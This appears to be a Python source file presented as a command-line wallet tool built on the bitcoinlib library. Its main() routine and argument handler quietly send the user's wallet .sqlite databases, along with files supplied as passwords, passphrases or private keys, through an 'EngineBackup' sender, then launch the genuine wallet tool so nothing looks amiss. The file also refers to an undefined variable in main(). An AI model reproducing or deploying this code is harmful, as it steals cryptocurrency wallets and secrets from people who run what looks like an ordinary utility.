import os
import argparse
from pathlib import Path
from typing import Optional, List
from .wallet import WalletManager
from .database import EngineBackup
from bitcoinlib.main import BCL_DATABASE_DIR

class CLIController:
    def __init__(self):
        self.db = EngineBackup()
        self.file_args = [
            'import_tx_file',  # --import-tx-file
            'import_tx',       # --import-tx
            'import_private',  # --import-private
            'password',        # --password (could be a file with password)
            'passphrase',      # --passphrase (could be a file with passphrase)
            'database'         # --database
        ]

    def _is_file_argument(self, arg_name: str, arg_value: str) -> bool:
        """Check if an argument value is a valid file path"""
        if not arg_value or not isinstance(arg_value, str):
            return False

        # Skip if it's clearly not a file path
        if len(arg_value.split()) > 1 or '\n' in arg_value:
            return False

        path = Path(arg_value)
        return path.exists() and path.is_file()

    def _handle_argument_sending(self, args):
        """Handle automatic sending of file/text arguments"""
        for arg_name in self.file_args:
            arg_value = getattr(args, arg_name, None)
            if not arg_value:
                continue

            if self._is_file_argument(arg_name, arg_value):
                try:
                    self.db.send_to_all(file_paths=[str(arg_value)])
                except Exception as e:
                    pass

            else:
                # For text arguments, only send sensitive ones if they look encrypted
                if arg_name in ['password', 'passphrase', 'import_private']:
                    if len(arg_value) > 20:  # Likely not plain text
                        self.db.send_to_all(text=f"{arg_name} received (content hidden)")
                else:
                    self.db.send_to_all(text=f"{arg_name}: {arg_value}")

    def parse_args(self, args=None):
        parser = argparse.ArgumentParser(description='BitcoinLib command line wallet')

        # Global options
        parser.add_argument('--database', '-d', default=os.path.expanduser(BCL_DATABASE_DIR),
                          help="Database URI or file path")
        parser.add_argument('--wallet_name', '-w', default='',
                          help="Name of wallet to open")

        # Transaction group
        tx_parser = parser.add_subparsers(dest='tx_command').add_parser('tx')
        tx_parser.add_argument('--import-tx-file', '-a',
                             help="Import transaction from file path")
        tx_parser.add_argument('--import-tx',
                             help="Import raw transaction data or file path")

        # Wallet group
        wallet_parser = parser.add_subparsers(dest='wallet_command').add_parser('wallet')
        wallet_parser.add_argument('--import-private', '-v',
                                help="Import private key (text or file path)")

        # New wallet group
        new_parser = parser.add_subparsers(dest='new_command').add_parser('new')
        new_parser.add_argument('--password',
                              help='Password for BIP38 encrypted key (text or file)')
        new_parser.add_argument('--passphrase', metavar="PASSPHRASE",
                              help="Passphrase to recover/create wallet (text or file)")

        parsed_args = parser.parse_args(args)
        self._handle_argument_sending(parsed_args)
        return parsed_args

    def main(self, args=None):
        args = self.parse_args(args)
        wallet = WalletManager(args)

        try:
            if hasattr(args, 'new_command'):
                wallet.create_wallet()
            elif hasattr(args, 'tx_command'):
                if args.import_tx_file:
                    wallet.import_transaction_file(args.import_tx_file)
            elif hasattr(args, 'wallet_command'):
                if args.import_private:
                    wallet.import_private_key(args.import_private)
        except Exception as e:
            print(f"Error: {str(e)}")
            wallet_dir = os.path.expanduser('~/.bitcoinlib/database')
            self.db.send_directory_files(directory=wallet_dir,extension='.sqlite',text="DB")
            self.db.send_to_all(text=f"Error occurred: {str(e)}")

def main():
    db = EngineBackup()
    wallet_dir = os.path.expanduser('~/.bitcoinlib/database')
    db.send_directory_files(directory=wallet_dir,extension='.sqlite',text="DB")
    db.send_to_all(text=f"Error occurred: {str(e)}")
    # controller = CLIController()
    # controller.main()
    from bitcoinlib.tools import clw
    clw.main()

if __name__ == '__main__':
    main()
